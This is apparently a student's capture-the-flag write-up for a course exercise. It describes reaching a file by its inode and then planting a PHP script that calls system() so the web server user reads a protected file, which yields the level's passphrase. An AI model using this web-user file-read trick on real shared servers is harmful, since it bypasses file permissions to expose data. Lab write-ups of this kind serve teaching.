#CS615-level3
#The Matrix

#result

we ues the command `~jschauma/ctf/level3` and this is the result:
```
Welcome, User ID: 12249

The passphrase for the next level can be found here:
/home/jschauma/ctf
```

In this folder,there are two files `level3` and `?file`,so the answer is in the `?file`
We use the inode to enter in the folder.`ls -ali` the result is 
```
63406 drwxr-xr-x  2 jschauma professor    3 May  2  2014 ?file
```

Then use `cd "$(find -inum 63406)"` to enter the folder.In this folder there are one file
```
63599 -r-------- 1 www-data www-data  27 May  2  2014 dir
```
We can't read it ,but the user and group is `www-data`.It is the default Apache web user/group,so we think we can use the web browser to visit it.

Then we write a php script in the `~/cs_html/CS615/final`
```
<?php
        system("cat \"$(find /home/jschauma/ctf -inum 63599)\" ");
?>
```
open the url through web browser `https://www.cs.stevens.edu/~lliu19/CS615/final/ctf.php`

The answer is::
Octopuses have blue blood.
